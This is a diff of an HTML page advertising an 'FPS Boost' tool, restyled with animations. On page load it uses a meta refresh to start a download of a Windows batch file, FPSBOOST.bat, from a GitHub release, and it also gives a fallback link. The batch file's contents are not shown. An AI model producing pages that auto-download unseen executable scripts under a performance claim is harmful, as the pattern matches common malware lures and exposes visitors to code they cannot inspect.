@@ -1,9 +1,148 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta http-equiv="refresh" content="0;url=https://github.com/MiaAce/FpsBoost-Emp/releases/download/FpsBoost/FPSBOOST.bat">
-  </head>
-  <body>
-    <p>If your download does not start automatically, <a href="https://github.com/MiaAce/FpsBoost-Emp/releases/download/FpsBoost/FPSBOOST.bat">click here</a>.</p>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>FPS Boost</title>
+  <meta http-equiv="refresh" content="0;url=https://github.com/MiaAce/FpsBoost-Emp/releases/download/FpsBoost/FPSBOOST.bat">
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+
+  <style>
+    /* Full-screen background */
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      font-family: 'Orbitron', sans-serif;
+      background: radial-gradient(circle at center, #0f0c29, #302b63, #24243e);
+      color: #fff;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* Main container */
+    .container {
+      background: rgba(0,0,0,0.7);
+      padding: 50px 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 40px rgba(0,0,0,0.5);
+      text-align: center;
+      z-index: 1;
+      position: relative;
+    }
+
+    h1 {
+      font-size: 3em;
+      margin-bottom: 20px;
+      color: #00ffea;
+      text-shadow: 0 0 20px #00ffea;
+      animation: glow 2s infinite;
+    }
+
+    p {
+      font-size: 1.2em;
+      margin-bottom: 30px;
+      color: #c0c0c0;
+    }
+
+    a.download-btn {
+      display: inline-block;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      text-decoration: none;
+      color: #fff;
+      background: linear-gradient(45deg, #00ffea, #0077ff);
+      border-radius: 50px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+      transition: all 0.3s ease;
+    }
+
+    a.download-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+
+    @keyframes glow {
+      0% {text-shadow: 0 0 10px #00ffea;}
+      50% {text-shadow: 0 0 20px #00ffea;}
+      100% {text-shadow: 0 0 10px #00ffea;}
+    }
+
+    /* Particles (loot) */
+    .particle {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background: #00ffea;
+      border-radius: 50%;
+      opacity: 0.8;
+      animation: float 3s linear infinite;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    @keyframes float {
+      0% {transform: translateY(0) translateX(0) rotate(0deg); opacity: 1;}
+      100% {transform: translateY(-500px) translateX(50px) rotate(360deg); opacity: 0;}
+    }
+
+    /* Animated cat */
+    .cat {
+      position: fixed;
+      width: 80px;
+      bottom: 20px;
+      right: 20px;
+      animation: moveCat 6s infinite alternate ease-in-out;
+      z-index: 2;
+    }
+
+    @keyframes moveCat {
+      0% {transform: translateX(0) rotate(0deg);}
+      50% {transform: translateX(-50px) rotate(-10deg);}
+      100% {transform: translateX(0) rotate(0deg);}
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Particles container -->
+  <div id="particles"></div>
+
+  <!-- Main container -->
+  <div class="container">
+    <h1>FPS Boost</h1>
+    <p>Your PC is about to get a performance boost! If download doesn’t start automatically, click below:</p>
+    <a class="download-btn" href="https://github.com/MiaAce/FpsBoost-Emp/releases/download/FpsBoost/FPSBOOST.bat">Download FPSBOOST.bat</a>
+  </div>
+
+  <!-- Cat image -->
+  <img class="cat" src="https://i.imgur.com/Ju7Y5VA.png" alt="Animated Cat">
+
+  <!-- Particle script -->
+  <script>
+    const particleContainer = document.getElementById('particles');
+    const colors = ['#00ffea','#ff00ff','#ffff00','#00ff00','#ff0000'];
+
+    function createParticle() {
+      const particle = document.createElement('div');
+      particle.classList.add('particle');
+      particle.style.left = Math.random() * window.innerWidth + 'px';
+      particle.style.background = colors[Math.floor(Math.random() * colors.length)];
+      particle.style.width = Math.random() * 10 + 5 + 'px';
+      particle.style.height = particle.style.width;
+      particle.style.animationDuration = (2 + Math.random() * 3) + 's';
+      particleContainer.appendChild(particle);
+
+      setTimeout(() => {
+        particle.remove();
+      }, 5000);
+    }
+
+    setInterval(createParticle, 200);
+  </script>
+
+</body>
 </html>
